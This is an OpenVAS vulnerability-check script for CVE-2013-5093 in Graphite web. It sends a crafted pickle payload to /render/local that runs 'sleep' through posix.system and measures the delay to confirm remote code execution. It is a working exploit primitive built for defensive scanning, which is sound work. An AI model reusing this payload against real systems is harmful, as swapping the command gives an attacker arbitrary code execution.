###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_graphite_61894.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Graphite Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103774");
  script_bugtraq_id(61894);
  script_cve_id("CVE-2013-5093");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11865 $");

  script_name("Graphite Remote Code Execution Vulnerability");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61894");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-08-22 17:46:22 +0200 (Thu, 22 Aug 2013)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to execute
arbitrary code within the context of the application.");
  script_tag(name:"vuldetect", value:"Try to execute the 'sleep' command by sending a special crafted HTTP
request and check how long the response take.");
  script_tag(name:"insight", value:"In graphite-web 0.9.5, a 'clustering' feature was introduced to
allow for scaling for a graphite setup. This was achieved by passing pickles
between servers. However due to no explicit safety measures having been
implemented to limit the types of objects that can be unpickled, this creates
a condition where arbitrary code can be executed");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"summary", value:"Graphite is prone to a remote code-execution vulnerability.");
  script_tag(name:"affected", value:"Graphite versions 0.9.5 through 0.9.10 are vulnerable.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
buf = http_get_cache(item:"/", port:port);

if("<title>Graphite Browser</title>" >!< buf)exit(0);

host = http_host_name(port:port);
url = '/render/local';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 500")exit(0);

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  postData = 'line\ncposix\nsystem\np1\n(S\'sleep ' + i + '\'\np2\ntp3\nRp4\n.';

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host  + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Connection: close\r\n' +
        'Content-Length: ' + strlen(postData) + '\r\n' +
        '\r\n' +
        postData;


  start = unixtime();
  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5))exit(0);

}

security_message(port:port);
exit(0);
